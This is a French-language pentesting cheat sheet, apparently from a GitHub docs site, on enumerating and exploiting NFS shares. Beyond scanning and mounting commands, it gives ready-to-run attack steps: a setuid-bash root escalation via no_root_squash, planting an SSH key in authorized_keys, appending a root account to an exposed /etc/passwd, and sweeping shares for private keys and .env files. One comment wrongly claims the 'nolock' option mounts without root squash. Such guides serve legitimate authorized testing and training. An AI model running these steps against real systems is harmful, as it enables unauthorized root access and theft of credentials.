#  NFS Enumeration

NFS (Network File System) est un protocole de partage de fichiers en réseau principalement utilisé dans les environnements Linux/Unix. C'est une cible intéressante en pentest car il expose fréquemment des partages mal configurés accessibles sans authentification, permettant la lecture ou l'écriture de fichiers sensibles voire une escalade de privilèges.


##  Objectifs

- Identifier les exports NFS disponibles
- Tester l'accès sans authentification
- Enumérer les fichiers et répertoires exposés
- Trouver des fichiers sensibles (clés SSH, configs, etc.)
- Identifier des vecteurs d'escalade de privilèges


##  Ports

| Port | Service          |
|------|------------------|
| 111  | RPCBind          |
| 2049 | NFS              |
| 20048| mountd           |



##  Quick Enumeration
```bash
# Scan rapide
nmap -p111,2049 <target>

# Lister les exports
showmount -e <target>

# Enum avec nmap
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>

# Monter un partage
mount -t nfs <target>:/share /mnt/nfs
```



##  Workflow 
```
1. Scan des ports 111 / 2049
2. Lister les exports NFS (showmount)
3. Identifier les permissions (lecture / écriture)
4. Monter les partages accessibles
5. Enumérer les fichiers sensibles
6. Exploiter les mauvaises configurations (no_root_squash, etc.)
7. Escalade de privilèges si écriture possible
```



##  Nmap

### Scan basique
```bash
nmap -p111,2049 <target>
```

### Détection version
```bash
nmap -p111,2049 -sV <target>
```

### Scripts NSE
```bash
# Lister les exports
nmap -p111,2049 --script nfs-showmount <target>

# Lister les fichiers
nmap -p111,2049 --script nfs-ls <target>

# Stats du partage
nmap -p111,2049 --script nfs-statfs <target>

# Full enum
nmap -p111,2049 --script nfs-* <target>

# RPC info
nmap -p111 --script rpcinfo <target>
```



##  Enumeration

### Lister les exports disponibles
```bash
showmount -e <target>
```

### Lister les clients connectés
```bash
showmount -a <target>
```

### Lister les répertoires montés
```bash
showmount -d <target>
```

### Via rpcinfo
```bash
rpcinfo -p <target>
```

### Enum avancée avec nmap
```bash
nmap -sV -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>
```


##  Montage des partages

### Monter un partage
```bash
mkdir /mnt/nfs
mount -t nfs <target>:/share /mnt/nfs
```

### Monter sans root squash
```bash
mount -t nfs -o nolock <target>:/share /mnt/nfs
```

### Monter en NFSv3
```bash
mount -t nfs -o vers=3 <target>:/share /mnt/nfs
```

### Monter en NFSv4
```bash
mount -t nfs -o vers=4 <target>:/share /mnt/nfs
```

### Démonter
```bash
umount /mnt/nfs
```


##  Exploitation

### Recherche d'exploits
```bash
searchsploit nfs
```

### no_root_squash  Escalade de privilèges
```bash
# Si no_root_squash est activé, root local = root sur le partage
# 1. Monter le partage
mount -t nfs <target>:/share /mnt/nfs

# 2. Copier bash sur le partage
cp /bin/bash /mnt/nfs/bash

# 3. Setuid en tant que root
chmod +s /mnt/nfs/bash

# 4. Exécuter depuis la cible
/share/bash -p
```

### Ecriture de clé SSH autorisée
```bash
# Si /home/user/.ssh est exposé en écriture
ssh-keygen -t rsa -f /tmp/id_rsa
cat /tmp/id_rsa.pub > /mnt/nfs/.ssh/authorized_keys
ssh -i /tmp/id_rsa user@<target>
```

### Ecriture dans /etc/passwd (si exposé)
```bash
# Générer un hash de mot de passe
openssl passwd -1 -salt xyz password123

# Ajouter un utilisateur root
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /mnt/nfs/etc/passwd
```



##  Post-Exploitation

- Récupérer tous les fichiers accessibles
- Chercher des clés SSH privées (`id_rsa`, `id_ecdsa`)
- Chercher des fichiers de configuration sensibles
- Exploiter `no_root_squash` pour escalade
```bash
# Recherche de fichiers sensibles
find /mnt/nfs -name "*.key" -o -name "id_rsa" -o -name "*.conf" -o -name "*.env" 2>/dev/null

# Copie récursive
cp -r /mnt/nfs /tmp/nfs-dump
```



##  Anonymous Access

### Test accès sans authentification
```bash
showmount -e <target>
```

### Montage anonyme
```bash
mount -t nfs <target>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs
```

### Vérification des permissions
```bash
cat /etc/exports
# no_root_squash = dangereux
# rw = écriture possible
# * = tout le monde
```


##  Points d'attaque

- Exports accessibles sans authentification
- Option `no_root_squash` activée (escalade de privilèges)
- Permissions en écriture sur des répertoires critiques
- Fichiers sensibles exposés (clés SSH, configs, backups)
- Option `*(rw)` — accès depuis n'importe quelle IP
- NFS v2/v3 sans authentification Kerberos
- Répertoires home exposés



::: info Tips 

- Toujours vérifier `no_root_squash` dans `/etc/exports`
- Un partage en `*(rw,no_root_squash)` est une escalade de privilèges directe
- Chercher `id_rsa`, `.env`, `config.php`, `shadow`, `passwd`
- Tenter l'écriture d'une clé SSH dans `.ssh/authorized_keys`
- Corréler showmount + nmap + montage manuel
- NFS sur port 2049 UDP peut bypass certains firewalls

:::

::: details  Checklist

- Port 111 / 2049 ouvert
- Exports NFS listés (showmount)
- Permissions des exports identifiées
- Accès anonyme testé
- Partages montés
- Fichiers sensibles récupérés
- no_root_squash vérifié
- Escalade de privilèges tentée
- Ecriture SSH testée

:::


## 🧾 Notes
```
 # Notes terrain
```


##  Tools

- [Nmap](https://nmap.org/)
- [showmount](https://linux.die.net/man/8/showmount)
- [rpcinfo](https://linux.die.net/man/8/rpcinfo)
- [mount](https://linux.die.net/man/8/mount)
- [Metasploit](https://www.metasploit.com/)



## 📚 Ressources

- [HackTricks — NFS Pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [PayloadsAllTheThings — NFS](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Nmap NFS Scripts](https://nmap.org/nsedoc/scripts/nfs-showmount.html)
- [no_root_squash Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)



<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/nfs.md)</span>

</div>